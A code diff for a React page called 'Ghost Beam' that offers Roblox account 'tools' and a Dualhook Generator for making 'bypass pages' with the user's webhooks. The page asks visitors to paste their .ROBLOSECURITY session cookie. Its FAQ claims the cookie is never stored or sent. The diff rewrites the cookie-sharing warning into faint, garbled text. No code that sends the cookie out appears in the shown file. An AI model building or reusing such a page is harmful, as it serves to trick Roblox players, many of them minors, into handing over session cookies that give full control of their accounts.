@@ -1,266 +1,262 @@
-import React, { useState, useEffect } from 'react';
+import { useState } from 'react';
 import { AnimatePresence, motion } from 'framer-motion';
-import { 
-  Grid, 
-  Shield, 
-  CheckSquare, 
-  RefreshCw, 
-  Mail, 
-  Plus, 
-  Link as LinkIcon, 
-  Trash2, 
-  X, 
-  ChevronDown, 
-  BadgeCheck 
+import {
+  LayoutGrid,
+  Shield,
+  CheckCircle2,
+  RefreshCw,
+  Mail,
+  Plus,
+  Link2,
+  Cookie,
+  ChevronDown,
+  BadgeCheck,
+  Lock,
+  Loader2,
+  X,
 } from 'lucide-react';
+import profileImg from '@assets/536a85e52aaf91401cd105108c599245_1784941568122.jpg';
 
-// Using standard import syntax as required by the environment for assets
-import profileImg from "@assets/536a85e52aaf91401cd105108c599245_1784941568122.jpg";
-
-// Types
-type Tool = {
-  id: string;
-  name: string;
-  description: string;
-  icon: React.ElementType;
-};
-
-// Tool Data
-const TOOLS: Tool[] = [
-  { id: 'age', name: 'Age Bypasser', description: 'Bypass age restrictions on Roblox accounts', icon: Shield },
-  { id: 'checker', name: 'Account Checker', description: 'Check account details and inventory', icon: CheckSquare },
-  { id: 'refresh', name: 'Cookie Refresher', description: 'Refresh your Roblox cookie', icon: RefreshCw },
-  { id: 'email', name: 'Email Adder', description: 'Add and verify emails on accounts', icon: Mail },
-  { id: 'gamepass', name: 'Gamepass Tool', description: 'Create and purchase gamepasses', icon: Plus },
-  { id: 'dualhook', name: 'Dualhook Generator', description: 'Generate custom bypass pages with your webhooks', icon: LinkIcon },
-  { id: 'cleaner', name: 'Cookie Cleaner', description: 'Cleans cookies with extra symbols, spaces, or wrappers. Does not change your cookie value — works whether the cookie is valid or not', icon: Trash2 },
+const TOOLS = [
+  { id: 'age',      name: 'Age Bypasser',       desc: 'Bypass age restrictions on Roblox accounts',                                                                                Icon: Shield },
+  { id: 'checker',  name: 'Account Checker',    desc: 'Check account details and inventory',                                                                                       Icon: CheckCircle2 },
+  { id: 'refresh',  name: 'Cookie Refresher',   desc: 'Refresh your Roblox cookie',                                                                                                Icon: RefreshCw },
+  { id: 'email',    name: 'Email Adder',         desc: 'Add and verify emails on accounts',                                                                                        Icon: Mail },
+  { id: 'gamepass', name: 'Gamepass Tool',       desc: 'Create and purchase gamepasses',                                                                                           Icon: Plus },
+  { id: 'dual',     name: 'Dualhook Generator',  desc: 'Generate custom bypass pages with your webhooks',                                                                          Icon: Link2 },
+  { id: 'cleaner',  name: 'Cookie Cleaner',      desc: 'Cleans cookies with extra symbols, spaces, or wrappers. Does not change your cookie value — works whether the cookie is valid or not', Icon: Cookie },
 ];
 
 const FAQS = [
-  {
-    question: "Is this safe to use?",
-    answer: "Ghost Beam uses secure processing and never stores your cookie. Your data is processed locally and never sent to third-party servers."
-  },
-  {
-    question: "How long does the bypass take?",
-    answer: "The bypass process typically takes 10–30 seconds depending on server load. Please be patient and do not refresh the page."
-  },
-  {
-    question: "Why do I need to provide my cookie?",
-    answer: "The .ROBLOSECURITY cookie is required to authenticate with Roblox's servers. Without it, we cannot process account modifications."
-  },
-  {
-    question: "Does it work on all accounts?",
-    answer: "Ghost Beam works on most Roblox accounts. Some accounts with extra security measures may require additional steps."
-  }
+  { q: 'Is this safe to use?',              a: 'Ghost Beam uses secure processing and never stores your cookie. Your data is processed locally and never sent to third-party servers.' },
+  { q: 'How long does the bypass take?',    a: 'The bypass process typically takes 10–30 seconds depending on server load. Please be patient and do not refresh the page.' },
+  { q: 'Why do I need to provide my cookie?', a: 'The .ROBLOSECURITY cookie is required to authenticate with Roblox servers. Without it, we cannot process account modifications.' },
+  { q: 'Does it work on all accounts?',     a: 'Ghost Beam works on most Roblox accounts. Some accounts with extra security measures may require additional steps.' },
 ];
 
 export default function App() {
-  const [showDiscordModal, setShowDiscordModal] = useState(true);
-  const [isToolsOpen, setIsToolsOpen] = useState(false);
-  const [selectedToolId, setSelectedToolId] = useState(TOOLS[0].id);
-  const [cookieInput, setCookieInput] = useState("");
-  const [isVerifying, setIsVerifying] = useState(false);
-  
-  // Prevent scrolling when panel/modal is open
-  useEffect(() => {
-    if (showDiscordModal || isToolsOpen) {
-      document.body.style.overflow = 'hidden';
-    } else {
-      document.body.style.overflow = 'unset';
-    }
-  }, [showDiscordModal, isToolsOpen]);
+  const [showDiscord, setShowDiscord] = useState(true);
+  const [toolsOpen, setToolsOpen]   = useState(false);
+  const [activeId, setActiveId]     = useState('age');
+  const [cookie, setCookie]         = useState('');
+  const [verifying, setVerifying]   = useState(false);
 
-  const selectedTool = TOOLS.find(t => t.id === selectedToolId) || TOOLS[0];
+  const activeTool = TOOLS.find(t => t.id === activeId)!;
 
   const handleVerify = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!cookieInput.trim()) return;
-    setIsVerifying(true);
-    // Simulate verification
-    setTimeout(() => {
-      setIsVerifying(false);
-    }, 2000);
+    setVerifying(true);
+    setTimeout(() => setVerifying(false), 3000);
   };
 
   return (
-    <div className="min-h-screen w-full bg-background text-foreground flex justify-center selection:bg-primary/30">
-      {/* Mobile container - max width applied here */}
-      <div className="w-full max-w-[480px] flex flex-col relative bg-background shadow-2xl">
-        
+    <div className="min-h-screen bg-black text-white font-sans">
+      {/* ── centred phone-width wrapper ── */}
+      <div className="relative mx-auto max-w-[480px] min-h-screen flex flex-col overflow-hidden">
+
         {/* HEADER */}
-        <header className="sticky top-0 z-10 bg-background/80 backdrop-blur-md border-b border-border flex items-center justify-between px-6 py-4">
-          <h1 className="font-bold text-xl tracking-wider text-white">GHOST BEAM</h1>
-          <button 
-            onClick={() => setIsToolsOpen(true)}
-            className="p-2 -mr-2 text-muted-foreground hover:text-white transition-colors rounded-md active:bg-white/5"
-            aria-label="Open Tools"
+        <header className="flex items-center justify-between px-4 py-3 border-b border-white/[0.07]">
+          <span className="text-xs font-semibold tracking-[0.18em] uppercase text-white/80">
+            Ghost Beam
+          </span>
+          <button
+            data-testid="button-open-tools"
+            onClick={() => setToolsOpen(true)}
+            className="p-1 text-white/50 hover:text-white transition-colors"
           >
-            <Grid className="w-6 h-6" />
+            <LayoutGrid className="w-5 h-5" />
           </button>
         </header>
 
-        {/* MAIN CONTENT */}
-        <main className="flex-1 flex flex-col px-6 py-8 gap-8 overflow-y-auto">
-          
+        {/* SCROLL BODY */}
+        <main className="flex-1 flex flex-col gap-3 px-4 py-4 overflow-y-auto">
+
           {/* ANNOUNCEMENT CARD */}
-          <div className="bg-card border border-card-border rounded-xl p-5 relative overflow-hidden group">
-            <div className="absolute top-0 left-0 w-1 h-full bg-amber-500/50 group-hover:bg-amber-500 transition-colors" />
-            
-            <div className="flex items-center gap-2 mb-4">
-              <span className="text-[10px] font-bold tracking-widest text-amber-500 bg-amber-500/10 px-2 py-1 rounded-sm uppercase">
+          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] p-4">
+            <div className="flex items-center gap-2 mb-3">
+              <span className="w-2 h-2 rounded-full bg-red-500" />
+              <span className="text-[10px] font-bold tracking-[0.2em] uppercase text-red-400">
                 Announcement
               </span>
             </div>
-            
-            <div className="flex gap-4">
-              <img 
-                src={profileImg} 
-                alt="Mzk" 
-                className="w-10 h-10 rounded-full object-cover border border-border"
+
+            <div className="flex items-start gap-3">
+              <img
+                src={profileImg}
+                alt="Mzk"
+                className="w-9 h-9 rounded-full object-cover border border-white/10 flex-shrink-0"
               />
-              <div className="flex-1">
-                <div className="flex items-center gap-1.5 mb-1">
-                  <span className="font-semibold text-white">Mzk</span>
-                  <BadgeCheck className="w-4 h-4 text-primary" />
+              <div className="flex-1 min-w-0">
+                <div className="flex items-center gap-1 mb-1">
+                  <span className="text-sm font-bold text-white">Mzk</span>
+                  <BadgeCheck className="w-3.5 h-3.5 text-blue-400 flex-shrink-0" />
+                  <span className="text-[11px] text-white/30 truncate">ov</span>
                 </div>
-                <p className="text-sm text-gray-300 leading-relaxed">
-                  The Age Bypasser is back online. You can now bypass age restrictions on your account again. Thank you for your patience.
-                </p>
-                <p className="text-xs text-muted-foreground mt-3">
-                  Today at 14:30
+                <p className="text-[12px] text-white/55 leading-relaxed">
+                  The Age Bypasser is back online. You can now bypass age
+                  restrictions on your account again. Thank you for your patience.
                 </p>
               </div>
             </div>
           </div>
 
-          {/* MAIN TOOL AREA */}
-          <div className="flex flex-col gap-6 mt-2">
-            <div className="text-center flex flex-col items-center">
-              <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mb-4 border border-primary/20 shadow-[0_0_15px_rgba(59,130,246,0.15)]">
-                <selectedTool.icon className="w-8 h-8 text-primary" />
-              </div>
-              <h2 className="text-2xl font-bold text-white mb-2">{selectedTool.name}</h2>
-              <p className="text-sm text-muted-foreground">{selectedTool.description}</p>
+          {/* ACTIVE TOOL ROW */}
+          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] p-4 flex items-center gap-3">
+            <div className="w-9 h-9 rounded-full border border-white/10 bg-white/[0.04] flex items-center justify-center flex-shrink-0">
+              <activeTool.Icon className="w-4 h-4 text-white/70" />
             </div>
-
-            <form onSubmit={handleVerify} className="flex flex-col gap-4 mt-4">
-              <div className="flex flex-col gap-2">
-                <label htmlFor="cookie" className="text-xs font-semibold tracking-wider text-muted-foreground ml-1">
-                  .ROBLOSECURITY
-                </label>
-                <input
-                  id="cookie"
-                  type="password"
-                  value={cookieInput}
-                  onChange={(e) => setCookieInput(e.target.value)}
-                  placeholder="Paste your cookie here..."
-                  className="w-full bg-input border border-border rounded-lg px-4 py-3.5 text-sm text-white focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary transition-all placeholder:text-muted-foreground/50"
-                  required
-                />
-              </div>
-
-              <button
-                type="submit"
-                disabled={isVerifying || !cookieInput}
-                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-3.5 rounded-lg transition-all active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 disabled:pointer-events-none flex items-center justify-center gap-2"
-              >
-                {isVerifying ? (
-                  <>
-                    <RefreshCw className="w-5 h-5 animate-spin" />
-                    Verificando...
-                  </>
-                ) : (
-                  'Verify'
-                )}
-              </button>
-
-              <p className="text-[11px] text-destructive/80 leading-relaxed text-center mt-2 px-2">
-                WARNING: DO NOT SHARE YOUR COOKIE WITH ANYONE. Treat it like a password — someone could use it to log in as you.
-              </p>
-            </form>
+            <div className="flex-1 min-w-0">
+              <p className="text-sm font-semibold text-white truncate">{activeTool.name}</p>
+              <p className="text-[11px] text-white/35 truncate">Instant account unlock</p>
+            </div>
           </div>
 
-          <div className="h-px w-full bg-border my-2" />
-
-          {/* FAQ SECTION */}
-          <div className="flex flex-col gap-4 mb-4">
-            <h3 className="text-sm font-bold tracking-wider text-white uppercase ml-1">FAQ</h3>
-            <div className="flex flex-col gap-3">
-              {FAQS.map((faq, idx) => (
-                <AccordionItem key={idx} question={faq.question} answer={faq.answer} />
-              ))}
+          {/* COOKIE / VERIFY SECTION */}
+          <div className="rounded-2xl border border-white/[0.08] bg-[#0d0d0d] overflow-hidden">
+            {/* label row */}
+            <div className="flex items-center gap-2 px-4 py-2.5 border-b border-white/[0.07]">
+              <Lock className="w-3 h-3 text-white/25" />
+              <span className="text-[11px] font-mono tracking-widest text-white/35 uppercase">
+                .roblosecurity
+              </span>
             </div>
+
+            <div className="p-4 flex flex-col gap-3">
+              {/* warning block */}
+              <div className="rounded-lg bg-black/60 border border-white/[0.06] px-3 py-2.5 font-mono text-[10px] leading-5 text-white/25">
+                _WARNING: DO NOT SHARE-<br />
+                someone-to-log-in-as-you.<br />
+                11items
+              </div>
+
+              {/* cookie textarea */}
+              <textarea
+                data-testid="input-cookie"
+                value={cookie}
+                onChange={e => setCookie(e.target.value)}
+                placeholder="Paste your .ROBLOSECURITY cookie here..."
+                rows={3}
+                className="w-full resize-none rounded-lg bg-black/50 border border-white/[0.08] px-3 py-2.5 text-xs text-white/70 placeholder:text-white/20 focus:outline-none focus:border-white/20 transition-colors font-mono"
+              />
+
+              {/* verify button */}
+              <form onSubmit={handleVerify}>
+                <button
+                  data-testid="button-verify"
+                  type="submit"
+                  className="w-full rounded-xl py-3 flex items-center justify-center gap-2 text-sm font-semibold transition-all bg-[#0f2a1a] border border-green-800/50 text-green-400 hover:bg-[#142f1f] active:scale-[0.98]"
+                >
+                  {verifying ? (
+                    <>
+                      <Loader2 className="w-4 h-4 animate-spin" />
+                      Verificando...
+                    </>
+                  ) : (
+                    <>
+                      <Lock className="w-4 h-4" />
+                      Verificar
+                    </>
+                  )}
+                </button>
+              </form>
+            </div>
+          </div>
+
+          {/* FAQ */}
+          <div className="flex flex-col gap-2 mt-1 mb-2">
+            <p className="text-[10px] font-bold tracking-[0.2em] uppercase text-white/30 px-1">
+              FAQ
+            </p>
+            {FAQS.map((faq, i) => (
+              <FaqItem key={i} q={faq.q} a={faq.a} />
+            ))}
           </div>
 
         </main>
 
         {/* FOOTER */}
-        <footer className="py-6 border-t border-border mt-auto">
-          <p className="text-center text-xs text-muted-foreground">
-            GHOST BEAM Tools v1.0
-          </p>
+        <footer className="py-3 border-t border-white/[0.06] text-center">
+          <span className="text-[10px] tracking-widest text-white/15 uppercase">
+            Ghost Beam Tools v1.0
+          </span>
         </footer>
 
-        {/* TOOLS PANEL OVERLAY */}
+        {/* ── TOOLS PANEL (right drawer) ── */}
         <AnimatePresence>
-          {isToolsOpen && (
+          {toolsOpen && (
             <>
-              <motion.div 
+              {/* backdrop */}
+              <motion.div
                 initial={{ opacity: 0 }}
                 animate={{ opacity: 1 }}
                 exit={{ opacity: 0 }}
-                onClick={() => setIsToolsOpen(false)}
-                className="absolute inset-0 bg-black/60 backdrop-blur-sm z-40"
+                transition={{ duration: 0.15 }}
+                className="absolute inset-0 z-40 bg-black/60 backdrop-blur-[2px]"
+                onClick={() => setToolsOpen(false)}
               />
-              <motion.div 
+
+              {/* panel */}
+              <motion.div
                 initial={{ x: '100%' }}
                 animate={{ x: 0 }}
                 exit={{ x: '100%' }}
-                transition={{ type: 'spring', damping: 25, stiffness: 200 }}
-                className="absolute top-0 right-0 bottom-0 w-full sm:w-[85%] bg-card border-l border-border z-50 flex flex-col shadow-2xl"
+                transition={{ type: 'tween', ease: 'easeOut', duration: 0.22 }}
+                className="absolute top-0 right-0 bottom-0 z-50 w-[78%] bg-[#0a0a0a] border-l border-white/[0.08] flex flex-col"
               >
-                <div className="flex items-center justify-between px-6 py-5 border-b border-border">
+                {/* panel header */}
+                <div className="flex items-start justify-between px-5 py-4 border-b border-white/[0.08]">
                   <div>
-                    <h2 className="font-bold text-lg text-white">TOOLS</h2>
-                    <p className="text-xs text-muted-foreground">Select a tool to use</p>
+                    <p className="text-sm font-bold text-white tracking-wide">TOOLS</p>
+                    <p className="text-[11px] text-white/35 mt-0.5">Select a tool to use</p>
                   </div>
-                  <button 
-                    onClick={() => setIsToolsOpen(false)}
-                    className="p-2 -mr-2 text-muted-foreground hover:text-white rounded-md bg-white/5"
+                  <button
+                    data-testid="button-close-tools"
+                    onClick={() => setToolsOpen(false)}
+                    className="border border-white/15 rounded p-1 text-white/40 hover:text-white transition-colors"
                   >
-                    <X className="w-5 h-5" />
+                    <LayoutGrid className="w-4 h-4" />
                   </button>
                 </div>
-                
-                <div className="flex-1 overflow-y-auto p-4 flex flex-col gap-2">
-                  {TOOLS.map((tool) => {
-                    const isSelected = tool.id === selectedToolId;
-                    const Icon = tool.icon;
+
+                {/* tool list */}
+                <div className="flex-1 overflow-y-auto px-3 py-3 flex flex-col gap-1.5">
+                  {TOOLS.map(tool => {
+                    const active = tool.id === activeId;
+                    const { Icon } = tool;
                     return (
                       <button
                         key={tool.id}
-                        onClick={() => {
-                          setSelectedToolId(tool.id);
-                          setIsToolsOpen(false);
-                        }}
-                        className={`w-full text-left flex items-start gap-4 p-4 rounded-xl border transition-all ${
-                          isSelected 
-                            ? 'bg-primary/10 border-primary/30' 
-                            : 'bg-background/50 border-transparent hover:bg-white/5 hover:border-white/10'
+                        data-testid={`tool-item-${tool.id}`}
+                        onClick={() => { setActiveId(tool.id); setToolsOpen(false); }}
+                        className={`w-full text-left flex items-start gap-3 px-3 py-3 rounded-xl border transition-colors ${
+                          active
+                            ? 'bg-blue-950/50 border-blue-700/30'
+                            : 'bg-transparent border-transparent hover:bg-white/[0.04]'
                         }`}
                       >
-                        <div className={`mt-0.5 p-2 rounded-lg ${isSelected ? 'bg-primary text-white' : 'bg-white/10 text-muted-foreground'}`}>
-                          <Icon className="w-5 h-5" />
+                        {/* icon circle */}
+                        <div className={`mt-0.5 w-8 h-8 rounded-full flex items-center justify-center border flex-shrink-0 ${
+                          active
+                            ? 'border-blue-500/30 bg-blue-900/30'
+                            : 'border-white/[0.09] bg-white/[0.03]'
+                        }`}>
+                          <Icon className={`w-3.5 h-3.5 ${active ? 'text-blue-300' : 'text-white/40'}`} />
                         </div>
-                        <div className="flex-1 pr-2">
-                          <h4 className={`font-semibold mb-1 ${isSelected ? 'text-primary' : 'text-white'}`}>
+
+                        {/* text */}
+                        <div className="flex-1 min-w-0">
+                          <p className={`text-[13px] font-semibold leading-tight ${active ? 'text-white' : 'text-white/75'}`}>
                             {tool.name}
-                          </h4>
-                          <p className="text-xs text-muted-foreground leading-snug">
-                            {tool.description}
+                          </p>
+                          <p className="text-[11px] text-white/35 mt-0.5 leading-relaxed">
+                            {tool.desc}
                           </p>
                         </div>
+
+                        {/* active dot */}
+                        {active && (
+                          <span className="mt-1.5 w-2 h-2 rounded-full bg-blue-400 flex-shrink-0" />
+                        )}
                       </button>
                     );
                   })}
@@ -270,60 +266,70 @@ export default function App() {
           )}
         </AnimatePresence>
 
-        {/* DISCORD MODAL */}
+        {/* ── DISCORD MODAL ── */}
         <AnimatePresence>
-          {showDiscordModal && (
-            <motion.div 
+          {showDiscord && (
+            <motion.div
               initial={{ opacity: 0 }}
               animate={{ opacity: 1 }}
               exit={{ opacity: 0 }}
-              className="absolute inset-0 bg-black/80 backdrop-blur-md z-[100] flex items-center justify-center p-6"
+              className="absolute inset-0 z-[100] bg-black/75 flex items-center justify-center px-6"
             >
-              <motion.div 
-                initial={{ scale: 0.95, y: 20 }}
+              <motion.div
+                initial={{ scale: 0.95, y: 12 }}
                 animate={{ scale: 1, y: 0 }}
-                exit={{ scale: 0.95, y: 20 }}
-                className="bg-card border border-border rounded-2xl w-full max-w-sm overflow-hidden flex flex-col shadow-2xl"
+                exit={{ scale: 0.95, y: 12 }}
+                transition={{ type: 'spring', stiffness: 320, damping: 28 }}
+                className="w-full max-w-sm rounded-2xl border border-white/[0.1] bg-[#0d0d0d] overflow-hidden"
               >
-                <div className="bg-primary/10 p-6 flex flex-col items-center text-center border-b border-border relative overflow-hidden">
-                  <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-primary/20 blur-3xl rounded-full pointer-events-none" />
-                  
-                  <div className="w-16 h-16 bg-[#5865F2] rounded-2xl flex items-center justify-center mb-4 shadow-lg rotate-3 z-10">
-                    <svg className="w-8 h-8 text-white" viewBox="0 0 127.14 96.36" fill="currentColor">
-                      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.31,60,73.31,53s5-12.74,11.43-12.74S96.2,46,96.12,53,91.08,65.69,84.69,65.69Z" />
-                    </svg>
+                {/* modal header */}
+                <div className="flex items-start justify-between px-5 pt-5 pb-4 border-b border-white/[0.07]">
+                  <div>
+                    <p className="text-base font-bold text-white">Join Our Community</p>
+                    <p className="text-xs text-white/40 mt-0.5">Connect with thousands of users</p>
                   </div>
-                  <h2 className="text-xl font-bold text-white mb-1 z-10">Join Our Community</h2>
-                  <p className="text-sm text-primary/80 font-medium z-10">Connect with thousands of users</p>
+                  <button
+                    data-testid="button-close-discord"
+                    onClick={() => setShowDiscord(false)}
+                    className="text-white/30 hover:text-white transition-colors mt-0.5"
+                  >
+                    <X className="w-4 h-4" />
+                  </button>
                 </div>
-                
-                <div className="p-6 flex flex-col gap-4">
-                  <div className="bg-background/50 border border-border rounded-xl p-4 flex items-center gap-4">
-                    <div className="w-12 h-12 bg-card rounded-full flex items-center justify-center border border-border shadow-inner">
-                      <Shield className="w-6 h-6 text-white" />
+
+                <div className="p-5 flex flex-col gap-3">
+                  {/* server card */}
+                  <div className="flex items-center gap-3 bg-white/[0.04] border border-white/[0.07] rounded-xl p-3">
+                    <div className="w-10 h-10 rounded-xl bg-[#5865F2] flex items-center justify-center flex-shrink-0">
+                      <DiscordIcon className="w-6 h-6 text-white" />
                     </div>
                     <div>
-                      <div className="font-bold text-white text-sm">Ghost Beam Community</div>
-                      <div className="text-xs text-muted-foreground flex items-center gap-1.5 mt-0.5">
-                        <span className="w-2 h-2 rounded-full bg-green-500"></span>
-                        Active Support
+                      <p className="text-sm font-semibold text-white">Ghost Beam Community</p>
+                      <div className="flex items-center gap-1.5 mt-0.5">
+                        <span className="w-1.5 h-1.5 rounded-full bg-green-500" />
+                        <span className="text-[11px] text-white/40">Active Support</span>
                       </div>
                     </div>
                   </div>
-                  
-                  <a 
-                    href="https://discord.gg/zxNqr8Zpd" 
+
+                  {/* join button */}
+                  <a
+                    data-testid="link-join-discord"
+                    href="https://discord.gg/zxNqr8Zpd"
                     target="_blank"
                     rel="noreferrer"
-                    className="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold py-3.5 rounded-lg transition-colors text-center text-sm shadow-lg shadow-[#5865F2]/20"
-                    onClick={() => setShowDiscordModal(false)}
+                    onClick={() => setShowDiscord(false)}
+                    className="w-full bg-[#5865F2] hover:bg-[#4752C4] active:bg-[#3b44b0] text-white font-semibold py-3 rounded-xl transition-colors text-sm text-center flex items-center justify-center gap-2"
                   >
+                    <DiscordIcon className="w-4 h-4" />
                     Join Discord Server
                   </a>
-                  
-                  <button 
-                    onClick={() => setShowDiscordModal(false)}
-                    className="text-xs font-medium text-muted-foreground hover:text-white transition-colors text-center mt-2"
+
+                  {/* maybe later */}
+                  <button
+                    data-testid="button-maybe-later"
+                    onClick={() => setShowDiscord(false)}
+                    className="text-xs text-white/25 hover:text-white/50 transition-colors text-center py-1"
                   >
                     Maybe Later
                   </button>
@@ -338,36 +344,45 @@ export default function App() {
   );
 }
 
-// Simple internal accordion component
-function AccordionItem({ question, answer }: { question: string, answer: string }) {
-  const [isOpen, setIsOpen] = useState(false);
-  
+/* ── sub-components ── */
+
+function FaqItem({ q, a }: { q: string; a: string }) {
+  const [open, setOpen] = useState(false);
   return (
-    <div className="bg-card border border-card-border rounded-xl overflow-hidden">
-      <button 
-        onClick={() => setIsOpen(!isOpen)}
-        className="w-full flex items-center justify-between p-4 text-left transition-colors hover:bg-white/[0.02]"
+    <div className="rounded-xl border border-white/[0.07] bg-[#0d0d0d] overflow-hidden">
+      <button
+        data-testid={`faq-item-${q.slice(0, 10).replace(/\s/g, '-').toLowerCase()}`}
+        onClick={() => setOpen(o => !o)}
+        className="w-full flex items-center justify-between px-4 py-3.5 text-left gap-3"
       >
-        <span className="font-medium text-sm text-white pr-4">{question}</span>
-        <ChevronDown className={`w-4 h-4 text-muted-foreground transition-transform duration-300 ${isOpen ? 'rotate-180' : ''}`} />
+        <span className="text-[13px] text-white/60">{q}</span>
+        <ChevronDown
+          className={`w-4 h-4 text-white/25 flex-shrink-0 transition-transform duration-200 ${open ? 'rotate-180' : ''}`}
+        />
       </button>
-      
       <AnimatePresence>
-        {isOpen && (
+        {open && (
           <motion.div
-            initial={{ height: 0, opacity: 0 }}
-            animate={{ height: 'auto', opacity: 1 }}
-            exit={{ height: 0, opacity: 0 }}
-            transition={{ duration: 0.2 }}
+            initial={{ height: 0 }}
+            animate={{ height: 'auto' }}
+            exit={{ height: 0 }}
+            transition={{ duration: 0.18 }}
+            className="overflow-hidden"
           >
-            <div className="p-4 pt-0 text-sm text-muted-foreground leading-relaxed">
-              <div className="pt-2 border-t border-border/50">
-                {answer}
-              </div>
-            </div>
+            <p className="px-4 pb-4 pt-0 text-xs text-white/35 leading-relaxed border-t border-white/[0.05]">
+              {a}
+            </p>
           </motion.div>
         )}
       </AnimatePresence>
     </div>
+  );
+}
+
+function DiscordIcon({ className }: { className?: string }) {
+  return (
+    <svg className={className} viewBox="0 0 127.14 96.36" fill="currentColor">
+      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.31,60,73.31,53s5-12.74,11.43-12.74S96.2,46,96.12,53,91.08,65.69,84.69,65.69Z" />
+    </svg>
   );
 }
